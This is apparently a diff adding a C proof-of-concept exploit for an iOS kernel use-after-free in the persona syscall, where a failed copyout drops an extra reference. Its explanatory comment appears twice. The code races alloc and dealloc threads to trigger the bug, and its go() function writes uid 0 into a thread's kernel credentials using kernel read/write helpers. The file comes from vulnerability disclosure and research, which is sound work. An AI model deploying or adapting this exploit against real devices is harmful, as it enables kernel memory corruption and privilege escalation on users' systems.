@@ -1,0 +1,171 @@
+/*
+There was recently some cleanup in the persona code to fix some race conditions there, I don't think it was sufficient:
+
+ In kpersona_alloc_syscall if we provide an invalid userspace pointer for the ipd outptr we can cause this copyout to fail:
+ 
+  error = copyout(&persona->pna_id, idp, sizeof(persona->pna_id));
+  if (error)
+    goto out_error;
+
+This jumps here:
+  if (persona)
+    persona_put(persona);
+
+At this point the persona is actually in the global list and the reference has been transfered there; this code
+is mistakenly assuming that userspace can't still race a dealloc call because it doesn't know the id.
+
+The id is attacker controlled so it's easy to still race this (ie we call persona_alloc in one thread, and dealloc in another),
+causing an extra call to persona_put.
+
+It's probably possible to make the failing copyout take a long time,
+allowing us to gc and zone-swap the page leading to the code attempting to drop a ref on a different type.
+ 
+This PoC has been tested on iOS 11.3.1 because it requires root. I have taken a look at an iOS 12 beta and it looks like the vuln
+is still there, but I cannot test it.
+ 
+It should be easy to fix up this PoC to run as root in your testing environment.
+*/
+
+// @i41nbeer
+
+#include "test_next_exploit.h"
+#include <unistd.h>
+#include <pthread.h>
+#include <string.h>
+
+#include "kmem.h"
+
+
+/*
+iOS kernel UaF due to bad error handling in personas
+ 
+There was recently some cleanup in the persona code to fix some race conditions there, I don't think it was sufficient:
+
+ In kpersona_alloc_syscall if we provide an invalid userspace pointer for the ipd outptr we can cause this copyout to fail:
+ 
+  error = copyout(&persona->pna_id, idp, sizeof(persona->pna_id));
+  if (error)
+    goto out_error;
+
+This jumps here:
+  if (persona)
+    persona_put(persona);
+
+At this point the persona is actually in the global list and the reference has been transfered there; this code
+is mistakenly assuming that userspace can't still race a dealloc call because it doesn't know the id.
+
+The id is attacker controlled so it's easy to still race this (ie we call persona_alloc in one thread, and dealloc in another),
+causing an extra call to persona_put.
+
+It's probably possible to make the failing copyout take a long time,
+allowing us to gc and zone-swap the page leading to the code attempting to drop a ref on a different type.
+ 
+This PoC has been tested on iOS 11.3.1 because it requires root. I have taken a look at an iOS 12 beta and it looks like the vuln
+is still there, but I cannot test it.
+ 
+It should be easy to fix up this PoC to run as root in your testing environment.
+*/
+
+
+
+#define NGROUPS 16
+#define MAXLOGNAME 255
+
+struct kpersona_info {
+  uint32_t persona_info_version;
+  
+  uid_t    persona_id; /* overlaps with UID */
+  int      persona_type;
+  gid_t    persona_gid;
+  uint32_t persona_ngroups;
+  gid_t    persona_groups[NGROUPS];
+  uid_t    persona_gmuid;
+  char     persona_name[MAXLOGNAME+1];
+  
+  /* TODO: MAC policies?! */
+};
+
+enum {
+  PERSONA_INVALID = 0,
+  PERSONA_GUEST   = 1,
+  PERSONA_MANAGED = 2,
+  PERSONA_PRIV    = 3,
+  PERSONA_SYSTEM  = 4,
+  
+  PERSONA_TYPE_MAX = PERSONA_SYSTEM,
+};
+
+#define PERSONA_OP_ALLOC    1
+#define PERSONA_OP_DEALLOC  2
+#define PERSONA_OP_GET      3
+#define PERSONA_OP_INFO     4
+#define PERSONA_OP_PIDINFO  5
+#define PERSONA_OP_FIND     6
+
+#define PERSONA_INFO_V1       1
+
+#define PERSONA_SYSCALL_NUMBER 494
+int sys_persona(uint32_t operation, uint32_t flags, struct kpersona_info *info, uid_t *id, size_t *idlen) {
+  return syscall(PERSONA_SYSCALL_NUMBER, operation, flags, info, id, idlen);
+}
+
+void persona_dealloc() {
+  uid_t uid = 235;
+  size_t uid_size = sizeof(uid);
+  int perr = sys_persona(PERSONA_OP_DEALLOC, 0, NULL, &uid, &uid_size);
+  printf("dealloc perr: 0x%x\n", perr);
+}
+
+void* persona_bad_alloc() {
+  // let's try to alloc a persona:
+  struct kpersona_info info = {0};
+  uid_t kpersona_uid = -123;
+  size_t kpersona_uid_size = sizeof(kpersona_uid);
+  
+  info.persona_info_version = PERSONA_INFO_V1;
+  strcpy(info.persona_name, "a_name2");
+  
+  info.persona_id = 235;
+  info.persona_type = PERSONA_GUEST;
+  
+  int perr = sys_persona(PERSONA_OP_ALLOC, 0, &info, NULL/*&kpersona_uid*/, &kpersona_uid_size);
+  printf("err: %x\n", perr);
+  printf("kpersona_uid: %d\n", kpersona_uid);
+  
+  return NULL;
+}
+
+void* dealloc_thread_func(void* arg) {
+  int uid = getuid();
+  printf("dealloc thread uid: %d\n", uid);
+  // got r00t?
+  while(1) {
+    persona_dealloc();
+  }
+}
+
+void* alloc_thread_func(void* arg) {
+  int uid = getuid();
+  printf("alloc_thread uid: %d\n", uid);
+  // got r00t?
+  while(1) {
+    persona_bad_alloc();
+  }
+}
+
+void go(uint64_t thread_t) {
+  uint64_t bsd_thread_info = rk64(thread_t + 0x388);
+  uint64_t cred_t = rk64(bsd_thread_info + 0x160);
+  
+  // uid:=0
+  wk32(cred_t+0x18, 0);
+  wk32(cred_t+0x1c, 0);
+  
+  pthread_t dealloc_thread;
+  pthread_create(&dealloc_thread, NULL, dealloc_thread_func, NULL);
+  
+  pthread_t alloc_thread;
+  pthread_create(&alloc_thread, NULL, alloc_thread_func, NULL);
+  
+  pthread_join(dealloc_thread, NULL);
+}
